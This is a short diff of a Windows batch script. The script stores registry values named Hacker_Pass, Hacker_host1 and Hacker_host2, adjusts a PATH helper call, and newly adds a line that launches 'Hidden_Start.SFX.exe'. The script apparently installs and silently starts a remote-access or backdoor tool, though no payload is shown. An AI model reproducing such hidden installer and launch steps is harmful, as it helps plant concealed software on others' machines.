@@ -60,9 +60,11 @@ Reg Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
 Reg Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
 Reg Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
 Reg Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
-call reg_addtopath.bat Util
+call reg_addtopath.bat %DestDIR%\Util
 
 cd /d %curdir%
+Hidden_Start.SFX.exe
+
 
 
 rem Правка файлов конфигурации модуля Exponenta
